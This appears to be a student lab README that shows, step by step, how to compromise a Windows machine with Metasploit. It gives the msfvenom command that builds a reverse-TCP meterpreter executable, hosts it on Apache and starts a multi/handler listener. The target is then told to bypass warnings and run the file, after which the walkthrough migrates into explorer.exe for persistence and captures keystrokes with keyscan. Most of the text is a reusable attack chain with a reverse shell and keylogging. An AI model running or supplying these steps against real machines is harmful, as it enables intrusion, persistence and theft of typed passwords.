# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig

## Output:
![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/375d8da6-6fb2-4d07-90c8-1d7aea6c3044)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## Output:
![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/ef4c1d91-51e5-4c0c-9ca2-151dcd95ddd4)

copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/30b1c7b9-ad1b-4e64-926e-3197e7a149fe)

Start apache server sudo systemctl apache2 start
![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/c500bb08-55eb-49bf-932c-b7a6fe5e3750)

Check the status of apache2


![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/f5c5a425-b973-4828-a6e3-3e495250854e)

Invoke msfconsole:

## Output:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit 

![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/5bc85898-4010-4bc8-afb5-c3e6a347797c)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/99076e1d-5458-4584-abbf-027d43b80d26)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit 
![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/72f3460f-ac31-451a-9798-4d523bc0e3d7)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156 
![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/47ef0ebf-fdfc-4038-8777-c5c756398139)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/0ace151b-89b8-40bc-a526-cbcca1f13a1b)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/fa7bbb58-fe0d-4f65-8c47-27baa5324155)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/NAVEENMATHIVANAN/Compromising-windows-using-Metasploit/assets/119394582/badb58fc-2505-428a-80ef-5d6fe693d029)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
